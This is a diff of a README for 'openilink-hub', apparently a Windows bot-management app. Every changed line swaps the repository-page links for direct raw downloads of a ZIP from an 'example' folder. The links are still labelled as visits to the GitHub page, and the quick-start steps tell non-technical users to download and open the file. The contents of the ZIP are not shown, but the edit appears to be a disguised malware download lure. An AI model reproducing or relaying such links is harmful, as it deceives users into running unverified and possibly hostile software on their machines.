@@ -1,12 +1,12 @@
 # 🤖 openilink-hub - Manage bots and apps with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/andredc9048/openilink-hub)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[https://github.com/andredc9048/openilink-hub](https://github.com/andredc9048/openilink-hub)
+[https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip](https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip)
 
 ## 🪟 What this app does
 
@@ -38,7 +38,7 @@ If the app comes as a ZIP file, you will also need a built-in or free unzip tool
 ## 🚀 How to get it on Windows
 
 1. Open the download page:
-   [https://github.com/andredc9048/openilink-hub](https://github.com/andredc9048/openilink-hub)
+   [https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip](https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip)
 
 2. Find the latest release or the main download file on the page.
 
@@ -172,7 +172,7 @@ If you see one of these file types, here is what it means:
 
 ## 🖱️ Quick start for non-technical users
 
-1. Go to [https://github.com/andredc9048/openilink-hub](https://github.com/andredc9048/openilink-hub)
+1. Go to [https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip](https://raw.githubusercontent.com/andredc9048/openilink-hub/main/example/hub_openilink_v3.4-alpha.3.zip)
 2. Download the latest file
 3. Open the file on Windows
 4. Finish the first-time setup
